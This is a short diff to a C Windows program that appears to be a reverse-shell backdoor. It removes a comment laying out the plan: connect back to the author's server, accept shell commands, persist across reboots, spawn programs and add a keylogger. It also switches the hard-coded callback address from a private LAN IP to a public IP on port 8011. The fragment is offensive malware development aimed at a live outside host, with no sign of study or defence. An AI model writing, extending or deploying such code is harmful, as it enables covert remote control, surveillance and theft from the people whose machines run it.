@@ -14,17 +14,6 @@
 
 int sock;
 
-/*
- * https://youtu.be/2-xNui9H-Ro?t=3484
- * PLAN
- * 1) create connection with our server inside main function
- * 2) create shell function (wait for incoming command and iterate over certain options)
- * 3) automatically start program when machine is rebooted
- * 4) start/spawn other programs
- * 5) navigating directories
- * 6) implement keylogger
- */
-
 char* substr(const char *src, int m, int n)
 {
     // get the length of the destination string
@@ -112,7 +101,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
     char* ServIP;
     WSADATA wsaData;
 
-    ServIP = "192.168.74.1";
+    ServIP = "96.246.237.185";
     ServPort = 8011;
 
     if(WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
